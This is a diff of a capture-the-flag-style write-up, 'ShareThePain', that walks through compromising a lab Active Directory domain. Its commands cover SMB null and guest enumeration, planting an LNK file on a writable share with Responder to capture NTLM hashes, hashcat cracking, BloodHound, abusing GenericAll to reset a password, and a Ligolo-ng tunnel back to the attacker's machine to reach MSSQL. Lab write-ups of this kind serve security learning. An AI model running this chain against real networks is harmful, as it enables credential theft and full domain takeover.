@@ -1,16 +1,18 @@
 # ShareThePain
 
-# **Scope and Objective**
+## ShareThePain
 
-**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.
+## **Scope and Objective**
 
-**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.
+**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.
 
-**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.
+**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.
 
-## Recon ,Scanning, and Enumeration
+**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.
 
-### Rustscan
+### Recon ,Scanning, and Enumeration
+
+#### Rustscan
 
 ```bash
 PORT      STATE SERVICE       REASON          VERSION
@@ -113,39 +115,39 @@ Host script results:
 
 ```
 
-- Our rustscan revealed a lot of interesting information for our recon and enumeration
-- We do have `DC01.hack.smarter`  `hack.smarter` which we need to add to our `/etc/hosts`
+* Our rustscan revealed a lot of interesting information for our recon and enumeration
+* We do have `DC01.hack.smarter` `hack.smarter` which we need to add to our `/etc/hosts`
 
-### Initial access with our  NULL Authentication
+#### Initial access with our NULL Authentication
 
 ```bash
 nxc smb hack.smarter -u '' -p ''
 nxc smb hack.smarter -u 'guest' -p ''
 ```
 
-![image.png](ShareThePain/image.png)
+![image.png](<../.gitbook/assets/image (8).png>)
 
-- **Null Session Success:** The first command `nxc smb hack.smarter -u '' -p ''` shows that the server accepts a connection with a completely blank username and password.
-- **Guest Account Access:** The second command `-u 'guest' -p ''` confirms that the built-in `Guest` account is active and has no password.
+* **Null Session Success:** The first command `nxc smb hack.smarter -u '' -p ''` shows that the server accepts a connection with a completely blank username and password.
+* **Guest Account Access:** The second command `-u 'guest' -p ''` confirms that the built-in `Guest` account is active and has no password.
 
-### Enumerate shares
+#### Enumerate shares
 
 ```bash
 nxc smb hack.smarter -u 'guest' -p '' --shares
 
 ```
 
-![image.png](ShareThePain/image%201.png)
+![image.png](<../.gitbook/assets/image 1 (7).png>)
 
-- **`Share` (READ, WRITE):** This is your primary target. The fact that a Guest account has **WRITE** access is a major security misconfiguration. This allows for data exfiltration, malware hosting, or potentially poisoning files that other users might execute.
+* **`Share` (READ, WRITE):** This is your primary target. The fact that a Guest account has **WRITE** access is a major security misconfiguration. This allows for data exfiltration, malware hosting, or potentially poisoning files that other users might execute.
 
-### Enumerate Users
+#### Enumerate Users
 
 ```bash
 nxc smb 10.1.58.24 -u 'guest' -p '' --users
 ```
 
-![image.png](ShareThePain/image%202.png)
+![image.png](<../.gitbook/assets/image 2 (7).png>)
 
 Enumerate Users - Rid Brute Forcing
 
@@ -153,14 +155,14 @@ Enumerate Users - Rid Brute Forcing
 nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute
 ```
 
-![image.png](ShareThePain/image%203.png)
+![image.png](<../.gitbook/assets/image 3 (7).png>)
 
 ```bash
 nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute | grep  "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' 
 
 ```
 
-![image.png](ShareThePain/image%204.png)
+![image.png](<../.gitbook/assets/image 4 (7).png>)
 
 Enumerating valid Usernames
 
@@ -168,33 +170,32 @@ Enumerating valid Usernames
 kerbrute userenum --dc DC01.hack.smarter -d hack.smarter usernames.txt
 ```
 
-![image.png](ShareThePain/image%205.png)
+![image.png](<../.gitbook/assets/image 5 (7).png>)
 
-- all the usernames are valid
+* all the usernames are valid
 
 Shares
 
-![image.png](ShareThePain/image%206.png)
+![image.png](<../.gitbook/assets/image 6 (7).png>)
 
-![image.png](ShareThePain/image%207.png)
+![image.png](<../.gitbook/assets/image 7 (7).png>)
 
-- We were able to authenticate and the share is empty..
-- If we have access to a share with `write permissions`, we can put there a malicious file. On the other end we can have responder to catch the hash.
-- We can use `ntlm_thef.py` to perform this exploit https://github.com/Greenwolf/ntlm_theft
-- Or we can also perform Write ShareLNK File Attacks
-    
+* We were able to authenticate and the share is empty..
+* If we have access to a share with `write permissions`, we can put there a malicious file. On the other end we can have responder to catch the hash.
+* We can use `ntlm_thef.py` to perform this exploit https://github.com/Greenwolf/ntlm\_theft
+*   Or we can also perform Write ShareLNK File Attacks
+
     ```bash
     nxc smb hack.smarter -u 'guest' -p '' \
         -M slinky \
         -o SERVER=10.1.58.24 SHARE=Share NAME=ShareThePain
-    
+
     sudo responder -I tun0 -v -dP 
-    
+
     smbclient \\\\10.1.58.24\\Share -U guest
     ```
-    
-    ![image.png](ShareThePain/image%208.png)
-    
+
+    ![image.png](<../.gitbook/assets/image 8 (7).png>)
 
 OR
 
@@ -205,14 +206,14 @@ sudo responder -I tun0
 
 ```
 
-Or https://github.com/overgrowncarrot1/SMB_Killer.git
+Or https://github.com/overgrowncarrot1/SMB\_Killer.git
 
 ```bash
 sudo python3 SMB_Killer.py -r 10.1.58.24 -l 10.200.39.91 -d hack.smarter -i tun0 -a share -U '' -P '' -A
 
 ```
 
-![image.png](ShareThePain/image%209.png)
+![image.png](<../.gitbook/assets/image 9 (7).png>)
 
 Cracking the hash
 
@@ -221,25 +222,25 @@ hashcat -m 5600 -a0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```
 
-![image.png](ShareThePain/image%2010.png)
+![image.png](<../.gitbook/assets/image 10 (7).png>)
 
-![image.png](ShareThePain/image%2011.png)
+![image.png](<../.gitbook/assets/image 11 (7).png>)
 
 ```bash
 bob.ross:137Passowrd123!@#
 ```
 
-## Authenticating as `Bob.ROSS`
+### Authenticating as `Bob.ROSS`
 
 ```bash
 nxc smb hack.smarter -u bob.ross -p '137Password123!@#'
 ```
 
-![image.png](ShareThePain/image%2012.png)
+![image.png](<../.gitbook/assets/image 12 (7).png>)
 
-- Valid Creds
+* Valid Creds
 
-## Bloodhound
+### Bloodhound
 
 We can use the provided creds `faraday:hacksmarter123` to obtain the loot
 
@@ -247,43 +248,43 @@ We can use the provided creds `faraday:hacksmarter123` to obtain the loot
 nxc ldap DC01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.58.24 
 ```
 
-![image.png](ShareThePain/image%2013.png)
+![image.png](<../.gitbook/assets/image 13 (7).png>)
 
-### BloodHound Enumeration
+#### BloodHound Enumeration
 
-![image.png](ShareThePain/image%2014.png)
+![image.png](<../.gitbook/assets/image 14 (7).png>)
 
-- The user BOB.ROSS@HACK.SMARTER has GenericAll permissions to the user ALICE.WONDERLAND@HACK.SMARTER.
-- This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
+* The user BOB.ROSS@HACK.SMARTER has GenericAll permissions to the user ALICE.WONDERLAND@HACK.SMARTER.
+* This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
 
-![image.png](ShareThePain/image%2015.png)
+![image.png](<../.gitbook/assets/image 15 (6).png>)
 
-- The user ALICE.WONDERLAND@HACK.SMARTER is a member of the group REMOTE MANAGEMENT USERS@HACK.SMARTER.
+* The user ALICE.WONDERLAND@HACK.SMARTER is a member of the group REMOTE MANAGEMENT USERS@HACK.SMARTER.
 
-## Mapping our Attack Vector
+### Mapping our Attack Vector
 
-- Change Alice. wonderland password https://github.com/lineeralgebra/autobloodyAD?tab=readme-ov-file
-- Connect to remote management with Alice
+* Change Alice. wonderland password https://github.com/lineeralgebra/autobloodyAD?tab=readme-ov-file
+* Connect to remote management with Alice
 
-![image.png](ShareThePain/image%2016.png)
+![image.png](<../.gitbook/assets/image 16 (6).png>)
 
-## User - Flag
+### User - Flag
 
 ```bash
 Get-ChildItem -Path C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
 ```
 
-![image.png](ShareThePain/image%2017.png)
+![image.png](<../.gitbook/assets/image 17 (6).png>)
 
-## Priveledge Escalation
+### Priveledge Escalation
 
-![image.png](ShareThePain/image%2018.png)
+![image.png](<../.gitbook/assets/image 18 (6).png>)
 
-- Since Tyler is in the All Domain Admin group , we need to find a way to do a lateral movement to become him.
+* Since Tyler is in the All Domain Admin group , we need to find a way to do a lateral movement to become him.
 
-![image.png](ShareThePain/image%2019.png)
+![image.png](<../.gitbook/assets/image 19 (6).png>)
 
-- Permission was denied to perform anything with tyler
+* Permission was denied to perform anything with tyler
 
 Other useful enumeration commands:
 
@@ -293,15 +294,15 @@ net user alice.wonderland
 ls -Force
 ```
 
-![image.png](ShareThePain/image%2020.png)
+![image.png](<../.gitbook/assets/image 20 (6).png>)
 
-- Nothing too interesting here.
-- We can use a tool called `winpeas` but before that i like going to `C:\` and force for hidden items.
+* Nothing too interesting here.
+* We can use a tool called `winpeas` but before that i like going to `C:\` and force for hidden items.
 
-![image.png](ShareThePain/image%2021.png)
+![image.png](<../.gitbook/assets/image 21 (6).png>)
 
-- The most interesting item in that list is the **`SQL2019`** directory.
-- The SQL port was not accessible outside. We can conclude that it internal facing.
+* The most interesting item in that list is the **`SQL2019`** directory.
+* The SQL port was not accessible outside. We can conclude that it internal facing.
 
 Check the permissions of that folder immediately to see if you can modify it
 
@@ -310,9 +311,9 @@ Check the permissions of that folder immediately to see if you can modify it
 icacls C:\SQL2019
 ```
 
-![image.png](ShareThePain/image%2022.png)
+![image.png](<../.gitbook/assets/image 22 (6).png>)
 
-- Access denied
+* Access denied
 
 Check to see the running processes / Listening port (MSSQL-1433)
 
@@ -320,42 +321,41 @@ Check to see the running processes / Listening port (MSSQL-1433)
 netstat -ano | findstr LISTENING
 ```
 
-![image.png](ShareThePain/image%2023.png)
+![image.png](<../.gitbook/assets/image 23 (6).png>)
 
-- The standard SQL port (**1433**) is bound to `127.0.0.1` (localhost), not `0.0.0.0` or the external IP. This means you cannot reach this database from your Kali machine; you can only interact with it from within your current shell as Alice.
-- We need to use Ligolo-ng for port forwarding.
-    
+* The standard SQL port (**1433**) is bound to `127.0.0.1` (localhost), not `0.0.0.0` or the external IP. This means you cannot reach this database from your Kali machine; you can only interact with it from within your current shell as Alice.
+*   We need to use Ligolo-ng for port forwarding.
+
     ```bash
     #On my VM
     sudo ip tuntap add user RedBlue mode tun ligolo
     sudo ip link set ligolo up
     ./proxy -selfcert
-    
+
     # This adds a listener on the agent side (DC01) 
     # that redirects traffic to its own 127.0.0.1:1433
     listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433
     listener_add --addr 127.0.0.1:1433 --to 127.0.0.1:1433
-    
+
     #On My Vm on another terminal
     sudo ip route add 240.0.0.1 dev ligolo Special IP
-    
+
     #***Attacking machine _ using agent***
     ./agent -connect 10.200.39.91:11601 -ignore-cert
-    
-    ```
-    
-    ![image.png](ShareThePain/image%2024.png)
-    
-    ![image.png](ShareThePain/image%2025.png)
-    
-    ![image.png](ShareThePain/image%2026.png)
-    
 
-### Accessing the Database
+    ```
+
+    ![image.png](<../.gitbook/assets/image 24 (6).png>)
+
+    ![image.png](<../.gitbook/assets/image 25 (6).png>)
+
+    ![image.png](<../.gitbook/assets/image 26 (6).png>)
+
+#### Accessing the Database
 
 Now, the agent is listening on its Ethernet IP (`10.1.58.24`) on port 1433 and forwarding it to its own localhost. Since you have a route to `10.1.58.24` via the `ligolo` interface, you can target the agent's internal IP directly from your machine.
 
-![image.png](ShareThePain/image%2027.png)
+![image.png](<../.gitbook/assets/image 27 (6).png>)
 
 ```bash
 impacket-mssqlclient alice.wonderland:RedBlue777@10.1.58.24
